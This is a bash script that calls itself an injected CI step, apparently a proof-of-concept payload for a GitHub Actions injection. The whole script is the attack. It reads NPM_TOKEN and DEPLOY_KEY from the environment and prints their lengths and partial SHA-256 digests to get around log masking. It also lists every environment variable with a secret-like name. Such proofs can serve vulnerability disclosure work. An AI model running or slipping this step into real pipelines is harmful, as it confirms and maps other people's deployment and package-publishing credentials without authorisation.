#!/usr/bin/env bash
echo "=== INJECTED-STEP ENV READ  repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID ==="
# Log masking hides exact secret values, so prove possession by digest instead.
for name in NPM_TOKEN DEPLOY_KEY; do
  val="${!name}"
  if [ -n "$val" ]; then
    d=$(printf "%s" "$val" | sha256sum | cut -c1-24)
    echo "SECRET_${name}_PRESENT=yes LEN=${#val} SHA256_24=$d"
  else
    echo "SECRET_${name}_PRESENT=no"
  fi
done
echo "--- full env keys visible to the injected step ---"
env | cut -d= -f1 | grep -iE "token|key|secret|deploy|npm" | sort | sed "s/^/ENVKEY=/"
echo "=== END ==="
